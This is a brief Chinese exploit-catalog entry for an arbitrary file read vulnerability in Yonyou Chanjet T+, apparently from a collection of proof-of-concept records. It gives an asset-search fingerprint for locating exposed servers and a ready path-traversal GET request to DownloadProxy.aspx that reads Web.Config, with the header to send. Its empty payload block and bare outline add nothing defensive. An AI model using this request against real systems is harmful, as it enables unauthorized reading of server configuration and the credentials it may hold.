# 用友畅捷通TPlusDownloadProxy.aspx任意文件读取漏洞

- **系统**：用友　|　**类型**：任意文件读取/写入　|　**CVE**：—
- **指纹**：`app.name="畅捷通 T+"`
- **请求**：`GET /tplus/SM/DTS/DownloadProxy.aspx?preload=1&Path=../../Web.Config HTTP/1.1`
- **关键头**：`X-Ajaxpro-Method: GetStoreWarehouseByStore`　`Host: xx.xx.xx.xx`

**请求体 / payload**
```

```

**其他**
- 用友畅捷通TPlus DownloadProxy.aspx任意文件读取漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 用友畅捷通TPlus